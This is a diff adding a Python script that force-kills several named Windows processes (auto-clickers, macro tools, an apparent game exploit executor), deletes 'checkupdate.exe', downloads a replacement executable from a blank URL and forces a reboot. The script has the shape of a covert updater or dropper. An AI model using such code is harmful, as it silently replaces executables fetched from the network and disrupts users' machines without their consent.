@@ -1,0 +1,36 @@
+import requests
+from pathlib import Path
+import os
+import time
+import pyautogui
+from time import sleep
+import subprocess
+import requests
+import discord_webhook
+import json
+import wget
+import zipfile
+
+time.sleep(15)
+subprocess.call(["taskkill","/F","/IM","gs-auto-clicker-3.1.4-installer.exe"])
+subprocess.call(["taskkill","/F","/IM","Fluxus V7.exe"])
+subprocess.call(["taskkill","/F","/IM","launch.exe"])
+subprocess.call(["taskkill","/F","/IM","MacroRecorder.exe"])
+subprocess.call(["taskkill","/F","/IM","killfail.exe"])
+subprocess.call(["taskkill","/F","/IM","AutoMouseKey.exe"])
+subprocess.call(["taskkill","/F","/IM","checkupdate.exe"])
+time.sleep(2)
+def downnewver():
+    os.remove("C:\\checkupdate\\checkupdate.exe")
+    print ("Deleted Old Version")
+    time.sleep(1)
+    print ("Starting Download New Version")
+    filename = Path('checkupdate.exe')
+    url = ''
+    response = requests.get(url)
+    filename.write_bytes(response.content)   
+    print ("Success")
+    time.sleep(180)
+    os.system("shutdown /r /t 5")
+    
+downnewver()
